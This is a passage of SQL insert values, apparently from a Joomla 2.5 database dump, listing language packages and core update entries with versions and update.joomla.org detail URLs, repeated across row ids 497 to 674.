(497, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(498, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(499, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(500, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(501, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(502, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(503, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(504, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(505, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(506, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(507, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(508, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(509, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(510, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(511, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(512, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(513, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(514, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(515, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(516, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(517, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(518, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(519, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(520, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(521, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(522, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(523, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(524, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(525, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(526, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(527, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(528, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(529, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(530, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(531, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(532, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(533, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(534, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(535, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(536, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(537, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(538, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(539, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(540, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(541, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(542, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(543, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(544, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(545, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(546, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(547, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(548, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(549, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(550, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(551, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(552, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(553, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(554, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(555, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(556, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(557, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(558, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(559, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(560, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(561, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(562, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(563, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(564, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(565, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(566, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(567, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(568, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(569, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(570, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(571, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(572, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(573, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(574, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(575, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(576, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(577, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(578, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(579, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(580, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(581, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(582, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(583, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(584, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(585, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(586, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(587, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(588, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(589, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(590, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(591, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(592, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(593, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(594, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(595, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(596, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(597, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(598, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(599, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(600, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(601, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(602, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(603, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(604, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(605, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(606, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(607, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(608, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(609, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(610, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(611, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(612, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(613, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(614, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(615, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(616, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(617, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(618, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(619, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(620, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(621, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(622, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(623, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(624, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(625, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(626, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(627, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(628, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(629, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(630, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(631, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(632, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(633, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(634, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(635, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(636, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(637, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(638, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(639, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(640, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(641, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(642, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(643, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(644, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(645, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(646, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(647, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(648, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(649, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(650, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(651, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(652, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(653, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(654, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(655, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(656, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(657, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(658, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(659, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(660, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(661, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(662, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(663, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(664, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(665, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(666, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(667, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(668, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(669, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(670, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(671, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(672, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(673, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(674, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
